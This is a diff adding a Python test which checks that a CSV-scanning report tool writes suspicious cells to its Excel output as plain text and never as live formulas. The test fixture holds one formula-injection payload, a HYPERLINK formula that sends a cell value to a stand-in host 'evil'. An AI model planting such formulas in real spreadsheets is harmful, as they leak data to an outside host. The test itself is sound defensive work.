@@ -206,6 +206,19 @@ def test_report_has_three_sheets_and_summary(tmp_path):
     assert "K" in summary_text
 
 
+
+def test_report_never_runs_formulas_from_the_scanned_file(tmp_path):
+    csv_path = tmp_path / "evil.csv"
+    make_clean_csv(csv_path, n=40)
+    with open(csv_path, "a") as f:
+        f.write('"=HYPERLINK(""http://evil/?""&A2,""x"")",9999,50\n')  # flagged, so it lands on Anomalies too
+    limits_path, out_path = tmp_path / "limits.csv", tmp_path / "report.xlsx"
+    run_scan([str(csv_path)], str(limits_path), None, str(out_path))  # writes limits
+    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0
+    wb = load_workbook(out_path)
+    cells = [c for ws in wb for row in ws.iter_rows() for c in row if str(c.value).startswith("=HYPERLINK")]
+    assert len(cells) >= 2 and all(c.data_type == "s" for c in cells)  # Data + Anomalies: shown as text, never run
+
 # ---- Safety test ----
 
 def test_input_file_untouched(tmp_path):
